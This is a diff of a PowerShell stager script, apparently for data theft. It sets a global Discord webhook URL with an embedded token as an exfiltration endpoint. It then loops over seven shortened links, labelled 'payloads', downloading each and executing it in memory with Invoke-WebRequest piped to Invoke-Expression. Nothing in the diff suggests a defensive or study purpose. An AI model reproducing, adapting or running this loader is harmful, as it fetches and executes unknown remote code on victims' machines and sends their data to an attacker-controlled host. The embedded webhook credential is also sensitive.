@@ -1,7 +1,25 @@
-$dc = "$dc"
+# Define the Discord Webhook in the current session scope
+$Global:dc = "https://discord.com/api/webhooks/1323384833816133724/ehOw_K-Q-attnHgv0g93mWZJQfPE3ApYfsAqYp6cvahyO9oTmhAyHEJ9LJpVgB9wkXjo"
 
-iwr https://is.gd/bw_bh_to_dc | iex
-iwr https://is.gd/bwchdbdc | iex
-iwr https://is.gd/3RVLLl | iex
-iwr https://is.gd/8SpcqN | iex
-iwr https://is.gd/b6GaOU | iex
+# Array of all your payloads to keep the code clean
+$payloads = @(
+    "https://is.gd/bw_bh_to_dc",
+    "https://is.gd/bwchdbdc",
+    "https://is.gd/3RVLLl",
+    "https://is.gd/8SpcqN",
+    "https://is.gd/b6GaOU",
+    # "https://is.gd/kRX8yM", old master
+    "https://is.gd/iDZWzF",
+    "https://is.gd/9eLMGc"
+)
+
+# Execution Loop
+foreach ($url in $payloads) {
+    try {
+        # Use iwr + iex to pull and run each script in memory
+        iwr -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content | iex
+    } catch {
+        # Optional: Silent fail or log to Discord if one link is down
+        Write-Host "Error executing $url" -ForegroundColor Red
+    }
+}
